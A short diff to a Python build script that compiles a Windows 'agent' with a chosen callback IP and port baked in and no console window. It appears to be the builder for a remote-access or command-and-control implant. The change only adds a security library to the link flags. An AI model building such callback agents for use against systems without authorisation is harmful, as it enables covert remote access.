@@ -25,7 +25,7 @@ ip_addr = sys.argv[1]
 port = int(sys.argv[2])
 
 #Compile
-compile= f"gcc agent.c -DIP_ADDRESS={ip_to_int(ip_addr)} -DPORT={port} -Wl,-subsystem,windows -o agent -lws2_32 -lCrypt32"
+compile= f"gcc agent.c -DIP_ADDRESS={ip_to_int(ip_addr)} -DPORT={port} -Wl,-subsystem,windows -o agent -lws2_32 -lsecur32 -lCrypt32"
 try:
     subprocess.run(compile, shell=True, check=True)
     print("Compile Success")
